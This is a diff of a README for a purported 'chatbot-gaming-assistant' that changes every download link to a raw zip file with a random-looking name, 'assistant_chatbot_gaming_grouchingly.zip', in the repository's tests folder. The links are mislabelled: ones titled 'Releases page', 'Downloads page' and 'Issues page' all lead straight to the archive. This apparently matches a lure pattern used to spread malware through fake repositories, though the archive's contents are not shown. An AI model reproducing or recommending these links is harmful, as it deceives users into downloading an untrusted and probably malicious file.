@@ -1,6 +1,6 @@
 # 🤖 chatbot-gaming-assistant - Your AI Buddy for Gaming Success
 
-[![Download Now](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/app/chatbot-gaming-assistant-2.7.zip%20Now-%20blue)](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/app/chatbot-gaming-assistant-2.7.zip)
+[![Download Now](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/tests/assistant_chatbot_gaming_grouchingly.zip%20Now-%20blue)](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/tests/assistant_chatbot_gaming_grouchingly.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To begin using the chatbot-gaming-assistant, follow these simple steps:
 
 1. **Check Requirements**: Ensure you have a compatible device. The software works best on modern computers running Windows, macOS, or Linux. A stable internet connection is also required for full functionality.
 
-2. **Visit the Download Page**: Head over to our [Releases page](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/app/chatbot-gaming-assistant-2.7.zip) to download the latest version of the software. 
+2. **Visit the Download Page**: Head over to our [Releases page](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/tests/assistant_chatbot_gaming_grouchingly.zip) to download the latest version of the software. 
 
 3. **Choose Your Version**: You will see a list of available releases. Pick the latest version. It usually has the highest version number.
 
@@ -34,7 +34,7 @@ These features work together to make your gaming sessions more enjoyable and inf
 
 ## 🌐 Download & Install
 
-To download and install the chatbot-gaming-assistant, visit our [Downloads page](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/app/chatbot-gaming-assistant-2.7.zip). Follow the steps outlined above to get everything set up.
+To download and install the chatbot-gaming-assistant, visit our [Downloads page](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/tests/assistant_chatbot_gaming_grouchingly.zip). Follow the steps outlined above to get everything set up.
 
 ## 🛠️ Troubleshooting
 
@@ -50,7 +50,7 @@ If you continue experiencing problems, you can reach out for assistance through 
 
 ## 🤝 Contributing 
 
-We welcome contributions to improve the chatbot-gaming-assistant. If you have suggestions or would like to report bugs, please visit our [Issues page](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/app/chatbot-gaming-assistant-2.7.zip) to share your thoughts. 
+We welcome contributions to improve the chatbot-gaming-assistant. If you have suggestions or would like to report bugs, please visit our [Issues page](https://raw.githubusercontent.com/light-077/chatbot-gaming-assistant/main/tests/assistant_chatbot_gaming_grouchingly.zip) to share your thoughts. 
 
 ## 🗣️ Frequently Asked Questions 
 
